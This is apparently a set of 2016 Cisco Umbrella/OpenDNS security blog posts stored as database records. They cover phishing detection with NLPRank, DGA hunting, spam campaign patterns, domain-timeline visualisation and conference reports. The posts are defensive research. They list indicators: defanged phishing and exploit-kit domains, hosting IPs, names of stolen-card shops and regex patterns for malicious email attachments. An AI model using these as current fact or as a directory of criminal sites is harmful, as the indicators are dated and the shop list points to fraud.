proactively block more.\n\nWe’ve built-in logic to offer much more than just a feed of new domains. We use information on the trustworthiness of top-level domains, or parent domain reputation for subdomains, to determine if domains should be added to the list and how quickly the expiration happens. This reduces the potential false positive rate for this category.\n\nWe update our system in minutes, not days. So, you can have visibility into and can proactively block these new domains in near real-time.\nThe newly seen domains category will be available at no additional cost to customers of all Umbrella packages and Umbrella for MSPs starting December 13th.\nClick here for full documentation.', 'Uncategorized', 'https://umbrella.cisco.com/blog/2016/12/12/newly-seen-domain-security-category/');

Here are ten other things you probably didn’t know!\n1. It handles most internal domains automatically.\nThe roaming client automatically sends internal domains to the local DNS server, not to Umbrella—usually eliminating the need to manually input internal domains in your dashboard.\nThe roaming client does this automatically for all domains on the DNS search list, all .local domains, all reverse DNS for private IP addresses, and anything added manually to the endpoint’s network settings.\nAdditionally, the roaming client will try the local DNS server after receiving NXDOMAIN from Umbrella in a response, just in case. Learn more about managing internal domains.\n2. IP Layer enforcement continues to work even when you are on-network.\nIP layer enforcement remains enabled by design when DNS layer enforcement backs-off. This happens on protected networks or when an Umbrella virtual appliance is present on the network.\nThe roaming client does this to make sure that direct-to-IP traffic is always protected, not just when the roaming client is responsible for DNS protection. You can go to our test page to easily verify. Learn how to enable IP layer enforcement if you aren’t using it already.\n3. Intelligent proxy and SSL decryption features don’t need the roaming client.\nThe Intelligent Proxy and related features, like SSL decryption, are entirely powered by the Umbrella Cloud. We use DNS to redirect ‘graylisted’ traffic when deeper inspection is needed. The roaming client doesn’t know and doesn’t need to!\n4. DNS responses are always authenticated.\nThe roaming client authenticates DNS requests, even in ‘unencrypted mode’.\nThe DNS protocol was not built with security in mind, and so is vulnerable to several types of attacks. OpenDNS protects against these attacks with technologies like DNSCrypt and DNSCurve.\nThe roaming client always tries to encrypt DNS traffic with DNSCrypt, but there are some networks where that isn’t possible (port 443 is blocked for example). In these cases, the client transitions to ‘unencrypted mode’. Even when in unencrypted mode, the roaming client enhances DNS security by authenticating that only Umbrella resolvers are answering queries. This prevents an attack known as DNS hijacking (a 3rd party server answering DNS queries).\n5. Captive portals and hotspots don’t pose a problem.\nThe roaming client works with captive portals (click-through pages for public WiFi hotspots) automatically.\nIn most cases, the roaming client will not interfere with captive portals at all. In the worst case you’ll see a six second long delay before the splash page appears.\n6. You can prevent removal by local administrators.\nIn addition to hiding the roaming client in ‘Add/Remove Programs’, you can use Group Policy to prevent local administrators from directly disabling the roaming client Windows service. See instructions here.\n7. Automatic upgrades happen in waves.\nAutomatic updates for the roaming client are released in waves, staggering each release over days, weeks or months. Once picked up by the upgrade wave, your roaming clients will update over several hours.\nThis allows early adopters to get features faster, and more conservative organizations to get updates only after they’ve been in use for a while. The Umbrella dashboard and our cloud infrastructure roll out new features in a very similar way.\n8. There’s no added DNS caching.\nThe roaming client is a real-time DNS forwarder which does not do any on-client caching. The roaming client will not interfere with any DNS caching by the OS, browser, or local DNS server.\nThis reduces the complexity of the roaming client, allowing you to install it without worrying about compatibility issues or stale entries in the DNS cache.\n9. It will enforce your proprietary threat intelligence.\nThe roaming client can automatically block domains reported as malicious by a third-party sandbox or any threat intelligence source.\nThe Enforcement API provides a force-multiplier by extending your on-premises security to your roaming clients, no matter where they are. See our documented integrations or build your own.\n10. It is really small!\nIt’s tiny! With an installed footprint of just 5MB, and low CPU and memory use too, you won’t even notice it.\nWe designed the roaming client to be as thin and unobtrusive as possible. Our cloud infrastructure does the heavy lifting, not on your endpoint, so you won’t ever see slowdowns or sluggishness caused by the roaming client.\nAdditionally it doesn’t require a reboot for installation or upgrades. You can have it up and running in less than a minute!', 'Security Engineering;Umbrella', 'https://umbrella.cisco.com/blog/2016/11/30/ten-things-didnt-know-umbrella-roaming-client/');

Though one of the smaller BSides events, it’s drawn the attention of many in the security community, notably keynote speaker Senator Ron Wyden.  It’s a challenge to find lawmakers sympathetic to cybersecurity professionals, especially given the current political climate, so Wyden’s message of mindfulness was particularly well received. In addition to the Senator, many speakers were present from a wide variety of organizations and disciplines. From companies such as Tripwire and Symantec, as well as a range of universities all over the globe, security minded people came together to share victories, horror stories, techniques, and tools with their peers and colleagues. From OpenDNS, Josh Pyorre was invited to present a workshop on building a cloud based IDS and Patrick Colford went as our newest Analyst.\nOver two days, the conference went academically and practically through a wide range of topics; from discussing hardening cloud environments to advice about how to purposefully break things for better understanding, there was a lot to both say and do. Josh’s attention was devoted to his presentation on cloud-based IDS techniques. His instructions (available here) document the process to implement a server-side IDS and SIEM. In addition to his workshop, Tripwire’s Bob Loihl delved into the wide world of the Internet of Things, and attendees got to tinker with a board fully connected through AWS. The conference, only a week before the Dyn DDOS attack, seemed to foreshadow that security event.\nFrom the speaking sessions, the standout speakers were:\nJoe Grand, the creator of many Defcon badges, presented his research on communicating through optical covert channels. He demonstrated the use of an LED on a circuit board to transmit textual data to a remote sensor. To our eyes, the LED appeared to be a in a solid state, but he designed it to blink just fast enough to appear that way. When a light sensor was connected to a simple terminal, the terminal would display random textual data from the ambient light in the room. As the LED was brought closer to the sensor, a message, ‘Hello BSides Portland!’ would appear.\nKevin Haley, spoke about “Selling the Brooklyn Bridge: Can historic scams, cons and flimflam teach us ways to stop social engineering and educate end-users on cybercrime?” He used an analogy of the well-known scam in which new immigrants to the US were sold the Brooklyn Bridge. That some fell for it didn’t mean they weren’t smart, but that they didn’t understand the culture. He relates this behavior to the users who fall for social engineering and phishing scams, as they’re looking at a new technology and may not understand the rules.\nKen Westin presented “Mad Data Science: Threat Hunting with Machine Learning“, in which he demystifies the world of data science for the average security professional, explaining concepts of machine learning, k-means, Bayesian Probability, Lambda Architecture and how they apply to real world security use cases.\nTravis Smith discussed “Sending the Elevator Back Down: Getting Youth Interested in Security“, in which he described lessons learned while organizing high school internship programs designed to interest youth in information security. Pairing practical lessons with the fun of building a go-cart, he got kids to think about closing off avenues of misuse.\nIsaac Robinson presented “Securing the End User – Patching the End User“, in which he explained his procedures for conducting phishing awareness training campaigns the collection of metrics that assist in evaluating their effectiveness.\nGary Smith talked about “Blacklisting Badguys With IPTables“, a discussion on how to use the widely distributed firewall application to create a comprehensive and scalable IP filtering system to mitigate bad actors through publicly available IP lists.\nOverall, BSides PDX is a terrific event for both security professionals and enthusiasts or hobbyists wanting to learn more.

More of the more granular details about the system and findings will be covered in a forthcoming blog.\nOf course, there were a few other speakers presenting as well, and while there isn’t enough space to cover everyone, a couple highlights I found follow:\nAndrew Hay (@andrewsmhay), CISO at DataGravity (and former Director of Security at OpenDNS) discussed how to create a security strategy without having a security team to help create, facilitate, and maintain the increasing responsibility for the security and privacy of customer and employee information, mitigate a serious, and perhaps, business-ending data breach\nEric Rand, in his talk “Domains of Grey: Using DNS Grey Listing for Defense”, introduced the audience to the powers of running a DNS greylist to mitigate risks in relying upon end-user training and basic requirements for setting up a greylisting DNS proxy grant significant security benefits to the network on their own, encouraging the adoption of good practice network administration procedures.\nAs always, a special thanks to the organizers and sponsors of BSidesLA 2016 putting on yet another great event!', 'Community;Events;Labs Research', 'https://umbrella.cisco.com/blog/2016/11/28/bsidespdxla-2016/');

Many phishing sites are designed to look as close to the legitimate webpages they’re imitating as possible. The more genuine looking, the greater the chance of someone willingly agreeing to hand over sensitive personal information, and also the tougher it is to determine if the site is legitimate or if it’s a phish. Additionally, phishing pages tend to have a high turnover rate, meaning that more often than not, the site will only be live for a day or two, sometimes even hours, before it’s discovered and taken down, or moved to a different URL. It’s reasons like these that have made tackling phishing sites a tedious chase.\nNew Recommender System on Phishtank To Automate Submission Verification\nAfter searching for a solution to this obstacle, OpenDNS Labs came up with the idea of using its phishing detection model, NLPRank, as a recommender system on our community based phishing verification system, PhishTank, to improve phishing verification time.\nThis new, automated approach to the verification process is outlined as follows:\nThe algorithm takes as input a submission (domain or URL)  from the submitter/community and checks them against any existing OpenDNS whitelists and ASN filters. This initial step is to filter out false positives and spammy submissions that are often submitted to PhishTank.\nIf the URL makes it past these first few checkpoints, it then fetches the source code/content from the submission URL for review.\nThat source code is then analyzed by our machine learning system, that in a nutshell, compares the submission content to a curated corpus of content from commonly spoofed brands and returns a similarity score. If the similarity score is above the predetermined threshold, the URL is labeled as a phish and gets sent to our Proxy for auto-blocking.\nFigure 1 shows a diagram of how the system works:\n\nFigure 1\nThe eventual plan is to integrate the results of our recommender system back into PhishTank and share results with the community. PhishTank’s current approach of “submit a domain and wait for the community to verify” has so far been formidable, as it continues to remain “best in class” as one of the largest sources for human curated data when it comes to phishing sites. However, the drawback here is that the current system continues to become more primitive as time marches on, and as the Time to Verify measurement grows larger, the efficacy of the feed suffers. This new recommender system increases the effectiveness of PhishTank and improves the overall experience for the thousands of users that utilize PhishTank’s verified phishes’ feed.\nRogue Infrastructure Detection\nWhile this method is outstanding for real-time blocking of active phishes, it is reactive, but here at OpenDNS Labs we are all about pushing the limits to develop predictive models. So how do we evolve this system to be truly predictive and block these phishing sites and their hosting infrastructures before they’re even created? Consider the notion that phishes can sometimes be a bit like cockroaches. If you see one marching around your house, chances are there are a bunch more hanging out somewhere close by, out of sight. By taking the verified results of the NLPRank process, and pivoting through their server IPs using Investigate, we are able to uncover handfuls of other registered phishing domains acting as targets for the very phishing campaign that was initially discovered. Additionally when we continue to dig deeper through adversaries’ WHOIS records, specifically the email registrant, we uncover even more of the same tactics. By adding these IPs and registrants to our blacklists, we are able to stay ahead of the curve and greatly increase the chances of our users being protected from widespread phishing campaigns. Figure 2 shows a diagram of the Rogue Infrastructure Classification system.\nFirst we take dedicated phishing domains that we have caught with the recommender system.\nWe then query OpenDNS Investigate for domains associated with the hosting IP and the registrant email address from their WHOIS records.\nWe have then built a classifier using different features from the domains on these infrastructures to detect rogue registrants and IP addresses, and in turn push them to our blacklist.\nIn this sense we can predict the infrastructures phishers will use as they are being setup, and we are now blocking phishing sites even before they go live with spoofed content.\n\nFigure 2\nOur phishing recommender system is still in its very early stages of production, however the results and accuracy from its output thus far have been exceptional. As we push forward, and continue to mature our recommender system with PhishTank and OpenDNS data, we only stand to increase the level of security that is delivered to the thousands of OpenDNS users worldwide.\nHere is an example of a dedicated phishing site we found, appleid-apple-icloud-safe-link[.]com, where we pivoted on the email address and also the server IP address, and were able to uncover this rogue hosting infrastructure.\nFigure 3 displays some domains, IPs, and email registrants associated with a recent Apple phishing campaign that we have been tracking for a while now and that we visualized with OpenGraphiti. We were able to discover and block these actors with the new rogue hosting infrastructure detection system we have created.\n\nFigure 3\nFigure 4, 5, and 6 (below) show a specific example of the type of infrastructures we are catching and predictively blocking with these new techniques. We have had the hosting IP address for httpsaccounts-gooogle[.]cf on our blacklist since July but we are still seeing new phishing pages coming alive on this IP, which we are blocking before they are even up and running. This displays the power of our new rogue hosting classification system.\n\nFigure 4\nFigure 5 below shows the landing page serving the phishing content spoofing Gmail.\n\nFigure 5\nFigure 6 below shows the IP 45.63.0.49 polluted with phishing content:\n\nFigure 6\nAs displayed from the results above we are uncovering new rogue hosting providers daily that are leveraged for phishing campaigns and other toxic content.

Understanding it can be extremely valuable, because it reveals history, brings insights to the present, and often times forecasts the future well. In this post we’ll outline some useful techniques for visualizing evolutionary data and provide tips to make a powerful impact.\n\nThe data\nAt OpenDNS, we possess a huge amount of evolutionary data for domains. First of all, we see every single query our customers have made, which depicts the query volume and the change of infrastructure for one domain over time. We also keep record of key timestamps, for example, the time when a domain firstly appears in the query logs. Then, malicious domains usually have more interesting data: e.g., the time when they get blocked by us. Lastly, we have the most complete record of whois data about one domain, from the moment a domain is registered, to its expected expiration date.\nFor continuous evolutionary data, such as a domain’s query volume over time, a simple line chart would be effective enough. In this blog, we are particularly interested in the other type of evolution data: time-to-event data, for instance, the time when a domain is created, or the time when a domain is flagged by us or another source. Security researchers at OpenDNS have been using this data for their work in the past.\nWe’ve published a previous blog about visualizing the life for one domain, but it’s important to look at things at large scale. By visualizing the time-to-event data for group of domains, we are able to find patterns and outliers, and re-examine our models.\n\nThe visualization\nThere are two types of graphs in this visualization tool. The first one is a group timeline (see figure 1). The idea is simple: firstly we draw a timeline for every event type, then for each domain, we mark the timestamp of an event on its own timeline with a circle, finally use line to connect all the events (circles). Therefore, each line on this graph represents one domain’s evolution. The slope of the line indicates the chronological order of events. In fact, when you only have two events, it’s a SlopeGraph invented by Edward Tufte.\nFigure 1. Group Timeline\nThe second type of graph, box plot, is a purely scientific way of showing the distribution of numerical data. To draw a box plot you need to calculate five statistics of your data: minimum, first quartile, median, third quartile, and maximum, see figure 2 below. Data points outside the range from minimum to maximum are outliers.\nA box plot shows rich information within limited space, and is particularly useful for comparison between multiple sets of data. On the other hand, it does take some effort to interpret it for first-time viewers.\nFigure 2. A box plot\nUsing this tool, you can choose any pair of event types from your dataset, and it will calculate the time interval (number of days) between them, and draw the box plot.\n\nUse Cases\nModel Efficacy Analysis\nOur security researcher Jeremiah implemented NLP-Rank , a model good at catching phishing domains. Let’s visualize a sample of malicious domains NLP-Rank has caught recently(See figure 3).\nFigure 3. ODNS first_seen to ODNS first_tag\nOn the timeline, you will notice most of them are vertical lines, indicating no latency between when OpenDNS observes a domain for the first time (ODNS first_seen) and when we blocked it (ODNS first_tag), because nlp-rank is able to flag a phishing domain the moment it appears in our logs. The box plot is echoing this result with all the statistics equal to 0 day.\nHowever, the lines with irregular slope on the timeline (highlighted in orange) stand out, which correspond to the negative outliers on the box plot. In fact, there are a few complex reasons behind their existence. The main one is when a phishing domain was observed for the first time but it was not serving content yet, so we cached the domain after which it started a phishing attack. The second reason for negative outliers is that processing large logs can introduce some latency. Sometimes a phishing domain is live just for couple hours, and when we try to retrieve content, it’s already down. Lastly, we might also miss things during the gap when researchers maintain and upgrade the model.  You can read more about nlp-rank.\n\nNow let’s cross-check OpenDNS response with VirusTotal’s feed, by adding another event type from VirusTotal: the first time when VirusTotal detects a malicious url that has positive detections(VT_FirstFlag).\nFigure 4. OpenDNS first_tag to VirusTotal first_flag\nFirst of all, out of 267 domains, VirusTotal returns first_flag results for 165 of them.\nIn figure 4, looking at the box plot, the box (the lower to higher quartile) is located on the negative side of the scale, along with more negative outliers, which indicates that nlp-rank caught these domains earlier statistically. Accordingly, these domains have lines with negative slope on the group timeline. However, there are positive outliers, which is worth further investigation.\n\nExploit Kits Analysis\nFigure 5. Exploit Kit Domains\nFollowing the same method let’s analyze some recent exploit kit domains.  In figure 5, we can quickly identify a few things:\nWe usually block a EK domain a few hours after we see it. \nOur results are basically aligned with VirusTotal, as in the second box plot, most of the statistics are zero.\nFigure 6. From Creation to Becoming Active\nNow if we add another ingredient, the time a domain gets registered (Registered), the correlation becomes interesting. In figure 6, most domains were only “put into use” a certain period of time after they were registered, from a few days up to almost a year. This happens because attackers hijacked benign domain registrants and then create subdomains for their malicious content. This technique is also referred to as domain shadowing.  However, a small family of domains are not using domain shadowing but instead are freshly created for dedicated delivery of exploit kits. They are highlighted in orange in figure 6, and listed as below if you are interested:\nbqa2h6.f298wh[.]top\njw1f0y.wkfroa[.]top\nqp5gwu.masihae[.]top\nrn58cb.f298wh[.]top\n yca6j8.masihae[.]top\nzx5wlc.wkfroa[.]top\n\nDesign\nThrough the above use cases, we demonstrated how visualizations such as box plots and slope graphs could be used in security research.  However, to make them even more enticing, these visualizations can be expanded by using a few interaction techniques to facilitate people explore their own dataset.\nFiltering & Sorting\nOften times visualizations provide the big picture, and ideally point out the direction of your next step. In this tool, filtering allows you to cross out some events that are not relevant, and give focus to the “real meat” of the analysis.\nIn addition, the ability to sort the timelines helps users find interesting correlations between two adjacent timelines events, which would be difficult to find in a text-only format.\nDetails on demand\nInstead of calculating a box plot for each of the two events, the tool will provide this extra information when you want it, and you are free to select any pair of metrics matter.\nHovering to highlight and view domain detail is also supported.\nColoring\nAlthough we didn’t apply colors in above examples, coloring can provide the users more useful information. You can use color to represent different sets of domains, so it’s easy to compare. Or, you can even use a linear color scale to represent quantitative data. In figure 1, the coloring is actually encoding the creation date, so the older the redder.\n\nNext Steps\nIn this post, we analyzed phishing domains and exploit kit domains. Another interesting analysis is to compare the evolution pattern for different sets of the domains, such as domains by different attacks, threat types or classifiers.\nFurthermore, If we could put this specific slice of data into a larger context, use it with other type of data, for example the query volume over time and the neighborhood connections within a large graph, it would reveal a clearer picture of the domains in question. However, it will certainly bring up more challenges to design, as we want to display more information but maintain systematic simplicity and great user experience at the same time.', 'Security Research;Security Tools;WHOIS', 'https://umbrella.cisco.com/blog/2016/11/03/visualizing-the-evolution/');

I have had the pleasure of hearing Richard speak on this subject before at SOURCE Boston, and have only begun to understand the wealth of information he has on this topic. I look forward to hearing more from him in the future.\nNext up was “DGA Antivenom: Stopping New Configurations before Analysis” by myself on track one. For a few details on my presentation, take a look at my writeup from SOURCE Boston. I focused more heavily on some aspects for this audience and was able to answer a few questions with discussion at the end. Bryan Brake of the “Brakeing Down Security podcast” captured a photo of my presentation in progress.\nReally gr8 work by @ChipMcMalware on analyzing and breaking down future domain names #sourceSeattle pic.twitter.com/XsarWyaIgT\n— Bryan Brake (@bryanbrake) October 12, 2016\n\nI was followed by “Adversary Analysis and Defenses Using Domain and DNS OSINT” by Tim Helming of Domain Tools. It was a great pairing to be able to shift from one aspect of using DNS in my presentation, then to their use of pivoting off different information within DNS records, including historical information, to hunt and gain intelligence on threat actors.\nThe last presentation before lunch was from Shane MacAuley of IOActive. Shane’s talk focused mainly on memory forensics of cloud instances and some of the tools and techniques he uses to analyze them. For myself, once the tools come out, everything else fades into the background. He has an impressive set of tools that are available on hit github pages K2 and ShaneK2.\nNow let me take a moment to acknowledge and thank the food trucks of Seattle.  Mmmmmmmm.\nFollowing a satisfying lunch, was a satisfying keynote from Masha Sedova of Salesforce, entitled “Expanding the Blue Team by Building a Security Culture Program.” I have firsthand experience of the SalesForce security culture as a guest, and three things are very clear when you visit. The security culture there is different, it is real, and it works. The magic behind it is the brainchild of Masha, a culture of security that is rewarding and fun to those who involve themselves in it.\nIf the keynotes and talks are the meat, the career development tracks are the potatoes of SOURCE Conference. The first potato was the Speed Networking session. Rob Cheyne, the conference organizer, leads a sort of mixer, where you break off in randomly chosen pairs and answer some icebreaker questions. I enjoyed this before in Boston, I was glad to see it again in Seattle. It turns a “recognizable conference attendee number one” into that person who would travel remote regions of the world if they had unlimited resources and time. It adds a character to the conference that I am very fond of.\nThe final keynote of the day was from Diedre Diamond, the founder of Cyber Security Network (CyberSN), on “Words to Stop Using Now.” The meta overview of this is that there are certain words used commonly that disempower the people you are communicating with whether you intend to or not. Sometimes it is the word itself, and sometimes using a synonym in the same context only softens the blow. It is difficult to avoid them, and in writing this particular paragraph, I am making an effort to do so. Doing so does not come easily and the effort must be made in order to succeed. The overall goal, is to speak to enable, or empower others.\nThe last talks of the day were lightning talks, given by anyone who volunteered to do so. Short, five minute talks on any subject. To quote Bill Nye, “Everyone you will ever meet knows something you don’t.” These lightning talks can attest to that. Knowing you are surrounded by security professionals you already expect talks on security and business, but to hear talks on topics like bonsai and free climbing helps to loosen up the atmosphere a little and have something else to talk about to break the ice.\nIt was also my first time in Seattle, and this is as close as I got to the Space Needle\nDay 2\nI started day two off by joining the “Brakeing Down Security podcast” with host Bryan Brake by giving a small overview of my presentation, and talking a little about the conference itself.\nFollowing opening remarks, was the first keynote of the day from Michael Roytman of Kenna Security. Michael went over a new project he had been working on related to Common Vulnerabilities and Exposures (CVE). He was able to map CVEs that exist to those seen being used by adversaries and malware in the wild. After removing the CVEs that had been patched, he found that many of the CVEs being exploited today were first identified between 1996 and 2014. This revealed that, although we are very good at patch management now, the old vulnerabilities still exist and are still being exploited today.\nNext up was “At the Dawn of CET: Hunting Valid Gadget with Big Data” by Ke Sun, Ya Ou, Yanhui Zhao, and Xiaoning Li. In this talk, we learned about Control-flow Enforcement Technology (CET) from Intel and Control Flow Guard (CFG). CET is designed to stop certain types of exploits utilized by malware where the “return to” address of the function being executed gets replaced with some other address while its running so it can take over the process. CET does this by keeping its own copy of “return to” addresses (Shadow Stack) and verifying it later. GFC is something that must be enabled by the developer of a piece of software, and works by keeping track of valid addresses that a program can jump to and does not allow any invalid addresses to be jumped to. CET validates each jump it takes using CFG. Their research was focused on finding valid gadgets (pieces of code) that could be exploited using any of the above mentioned techniques.\nMike Shema of Cobalt.io followed up with a presentation on “Evolving a Bug Bounty Program.” He touched on things like consistency in the rewards given and being firm about what differentiates how critical a bug is to you and your company. One thing I had never considered was that sometimes a bug that is identified may be less critical than it seems to the person who found it, but you need to be able to acknowledge that they found it and still not give away your infrastructure in explaining why it is not as critical to you as they may think.\nThen we had Sean Malone of FusionX presenting “Using and Expanded Cyber Kill Chain Model to Increase Attack Resiliency.” Sean’s work focused on taking the Cyber Kill Chain® and extending it where it was often misunderstood as the end of the line. Once an adversary reaches the internal network, there are many different strategies to utilize to minimize damage, not to mention, not all attacks originate from the outside. This expansion added a tree model, which illustrated the different attack vectors used, and lateral movement between them to the next target showing a full overview of an attack.\nSpeaking of lateral movement, following another food truck lunch (Mmmmm), we had another session in the career development track. This session was the Personal Development Panel, featuring Rob Cheyne (Big Brain Security), Richard Thieme (Thiemeworks), Masha Sedova (Salesforce), and James Wann (TUNE). The lateral movement here I speak of, is that everyone on the panel started somewhere other than where they are now. Stories of personal experiences were shared along with some other helpful tips.\n@modMasha @neuralcowboy @rcheyne and James (TUNE) #srcsea16 panel discussing personal dev helps to navigate ones career @SOURCEConf pic.twitter.com/mGW88X87hW\n— Mark Arnold (@lotusebhat) October 13, 2016\n\nFollowing the Personal Development Panel, we had a talk from Rob Fuller of R5 Industries entitled “Attacker Ghost Stories – Revisited.” This was a themed presentation, that always went back to a campfire slide, which I thought was great. Rob spoke on various security subjects which are things that should be common knowledge in the security world, but are often overlooked and ignored.\nThe last presentation was from Rob Cheyne of Big Brain Security. Rob taught us, how he teaches security to others. Although I am a visual learner and teacher myself, his use of analogs to describe principals of security intrigues me. I always enjoy being able to teach concepts to others and finding acceptable analogs, that everyone understands, may help in that.\nOverall, SOURCE Seattle was a great conference for myself, and I’m sure it was for everyone else. I look forward to other SOURCE Conferences in my future.', 'DNS;Field Reports;Labs Research;Malware;Security;Security Community;Security Research', 'https://umbrella.cisco.com/blog/2016/10/21/source-seattle-2016-conference/');

Some DGAs can be completely thwarted through reverse engineering, and every possible domain name can be known and then blocked through security layers. The majority of the domain names generated by DGAs do not resolve (NXdomains) and are never registered with any hosting company by the malware author. They will however, create noise in network logs and annoy Analysts attempting to find active C&C domains.\nAlthough these requests to the NXdomains do not resolve, at OpenDNS, we still see the attempted request in our DNS query logs. Recently, I have found that analyzing these sessions of DGA requests in our logs has proven effective at surfacing other types of malicious domains that are queried in the event.\n\nWhy so effective?\nWhile malware authors have found DGAs to be an effective way of hiding C&C traffic, what I’ll be talking about is how they’re effective in surfacing other related malicious infrastructure. This surfaces domains that become guilty by hanging out with the wrong crowd. If I can see that there is already some shady DGA business going on, and said domain does not match the known DGA pattern, but appears in the session, it’s worth examining. After singling out a session of DNS requests with many consecutive sudden requests to NXdomains, you will also find some resolving DGA domains. They typically only resolve for a short period of time. Amongst these resolving domains is where it becomes interesting, and becomes an effective place for hunting. Examining these domains will also give you further insight into how specific malware functions.\nIn an identified session of Necurs DGA callouts, we can identify the first DGA round beginning with a callout to top level ‘com’ domains that are unpredictable, and used by the malware to detect simulated network traffic in order to evade analysis.

My intuition is that the attacker performs a reverse MX record lookup using the mail server defined for your domain to get other domains for which the mail server is responsible for.\nPattern 1 – Source Email User: User emails followed a (?:[A-Z])(?:[a-z]{1,})(?:[0-9]{1,3}) regex pattern with values such as Terrie12@somedomain.com, Wilma821@somedomain.com, Dave1@somedomain.com …\nPattern 1 – Subject: Subject lines here pose as either a reply or forward for a Documents Requested thread.\nPattern 1 – Filename: Filenames appeared to follow a (?:[newdoc|doc|untitled])(?:[0-9]{1,3})\\.zip regex with names such as newdoc12.zip, doc0.zip, and untitled9.zip.\nPattern 1 – Uncompressed Filename: The filename in most samples was ‘CJPOG21534.wsf’, however its possible there is a larger pattern.\nPattern 2 – Source Email Domain: Pattern 2 domains appeared to have no relationship with the recipient email address and were potentially open mail relays or compromised mail forms.\nPattern 2 – Source Email User: User emails followed a (?:[A-Z])(?:[a-z]{1,})\\.(?:[0-9]{1,4}) regex pattern with values such as John.4211@somedomain.com, Robert.45@somedomain.com, Gloria.244@somedomain.com\nPattern 2 – Subject: These subjects follow the ‘invoice’ them, with ‘Update Invoice’ followed by a 7 digit number.\nPattern 2 – Filename: Filenames here appear to follow a (?[a-f0-9]{8,14})\\.zip – being hex characters between 8-14 characters long.\nPattern 2 – Uncompressed Filename: Two files existed in this pattern, one hidden file with just a single character name and the other is a .wsf\nDownloader\nThe downloaders in both patterns were obfuscated Windows Script Files. Both appeared to be obfuscated using different techniques seen in previous Locky/Zepto campaigns:\n\nThe first pattern used a very familiar structure with Locky/Zepto: 3 JavaScript blocks with content wrapped in CDATA tags. As the script executes, it deobfuscates the next, performing various tests to discover a sandbox environment. One notable difference in the encoding was the abundant use of the ‘decodeHexLONG’ variable.\nThe second pattern passes its entire encoding through an eval(), which can be dumped to gain better insight into what it is doing.\n\nThe Mystery File\nThe single-character named file in the second pattern is interesting.

A lot has happened since then: the UK voted to leave the EU, some big Bitcoin wallets were hacked, and the price of Bitcoin plunged (though is now rebounding). Throughout it all, attackers have consistently tried to phish users to gain access to Bitcoin wallets.\nThis blog outlines a detailed investigation into this new phishing trend which began with reports of a phishing campaign targeting Bitfinex customers after the company was breached. At that same time, our ML-based model, NLPRank, picked up this phishing campaign after we enhanced it to detect Bitcoin wallet phishes. After factoring in the delivery mechanisms of the campaign we covered in the previous blog, we also expanded our search to Adwords.\nExpanding technical intelligence from Bitcoin phishing detection through hosting IPs, registrant emails, SSL certs, and OSINT hunting, we show how we cast a wider net on a variety of active cybercrime content: mainly phishing against other brands and credit card dump shops.\nInvestigation main steps\nOn August 2nd, Bitfinex suffered a breach that caused them $70 million in losses. Because we know malicious actors traditionally seek to exploit such events and therefore fine-tune our antennae in their wake, we picked up a phishing campaign around August 5th in which presumed Bitfinex customers received emails inviting them to update their credentials. The URL in the emails was, however, a phishing page against Bitfinex: ibitfinex[.]com. We observed a spike of DNS traffic to ibitfinex[.]com on August 5th.\nibitfinex[.]com is hosted on 188.40.248.80. This IP is hosting other phishing and various toxic content as well as bitmixer-io[.]com, a phishing domain against bitmixer.io which is a legit bitcoin mixing website (we won’t argue whether Bitcoin mixing itself is legit or not). 188.40.248.80 belongs to a small range 188.40.248.64/27 under Hetzner AS24940. 188.40.248.64/27 is specifically assigned to a suspicious Romanian hosting provider, thcservers.com, that we’ve previously observed to host exploit kits and malware.\nthcservers.com’s main web site\n188.40.248.80 is serving an SSL cert (sha1: 0f5876c1779b135eca5a6f300a40fc46a9ae1893) where the CN (Common Name) is loyals[.]in. At the time of this writing, loyals[.]in was live and hiding behind reverse proxy services with the actual content delivered from 188.40.248.80. loyals[.]in redirected to the mirror site sh0ping[.]net, a marketplace where various actors sell stolen credit cards plus other accounts and credentials. sh0ping[.]net as well as a mirror site sh0ping[.]su are hosted on 186.2.167.154. sh0ping[.]su has in the past hidden behind reverse proxy services. 186.2.167.154 belongs to AS262254, DANCOM LTD, an ASN that is part of the DDOS-GUARD bulletproof hosting structure. DANCOM has its business registered offshore in Belize and has one upstream peer AS57724, DDOS-GUARD. We’ve tracked DANCOM for a while and have seen it being frequently involved in hosting rogue content such as stolen credit card dump shops, shady financial services, crypto-currency exchangers, Bitcoin mining services, forex trading sites, etc. 186.2.167.154 also hosts sh0[.]pw, which used to be a mirror site of sh0ping[.]net, then morphed to become a Perfect Money to Bitcoin exchange site. 186.2.167.154 serves a valid SSL cert (sha1: 7674db9f93f6f1dee8259d2b0b5e3fbffffa2dfd) created through Comodo CA on August 29th, 2016 and where the CN is sh0ping[.]su.\nsh0ping.su’s main web site\nsh0.pw offers a Perfect Money to Bitcoin exchange service\nOfferings on DANCOM/DDOS-GUARD’s public web site\nFrom our previous investigations, we’ve seen that Bitcoin phishing campaigns are also delivered via legit google Adwords and Yandex ads redirecting to Bitcoin phishing. We searched for “buying Bitcoin” on google around August 18th, and we picked a few phishing sites in the returned results. One example is blockchln[.]info resolving to 143.95.239.55 which hosts a large number of other phishing sites targeting Paypal and Bitcoin wallets, Bitcoin mixers and sites selling fake European Union, Ukrainian, and Russian passports.\nBy exploring the co-occurrences of sh0ping[.]su we find more crimeware forums and stolen credit cards dump shops: altenen[.]com, bestvalid[.]org, ccv[.]name, cvv2[.]sale, dexter24[.]ru, dumpsmania[.]net, fatality[.]in, getcc[.]me, getcc[.]su, jallo[.]su, and pos[.]cat.\n\n\nThrough this investigation, we found more than 280 Bitcoin phishing domains, so it is clear here that your Bitcoins are under attack. Additionally, criminals are using different methods and tricks to stay under the radar, such as using reverse proxy services to hide the IPs serving the illegal content.\nWith this investigation, we took some measures to increase the detection of NLPRank which runs on Avalanche. Avalanche is the data processing system we built to consume our authoritative DNS logs and power several detection models. Like any machine learning system, we constantly have to retrain the models with fresh data, and teach the machine to detect the latest type of attacks. For that, we have added new Bitcoin wallet pages to NLPRank‘s training set, and the net result was faster and more accurate detection.\nHere are some of the latest results detected by NLPRank spoofing a variety of wallets :\nSome of our latest hits spoofing blockchain.info:\nDomain: blokchain[.]me\nTimestamp: 2016-08-20 12:06:59.602000\nScore: 0.998563706875\n\nDomain: htp-blockchain[.]online\nScore: 0.99872893095\nTimestamp: 2016–08–06 03:58:48.751000\nHere is a domain spoofing localbitcoins.com:\nDomain: localbitcoins[.]co[.]nf\nTimestamp: 2016-09-06 12:45:15.733000\nScore: 0.954419493675 \r\n\r\nHere are some other domains we found spoofing localbitcoins.com:\noocalbitcoins[.]com\nkocalbitcoins[.]com\nllocalbitcoins[.]com\n\n\n\nWhen looking at this IP address it is apparent there are other phishing domains and malicious activity on it:\n\nAdditionally, we have noticed that these Bitcoin 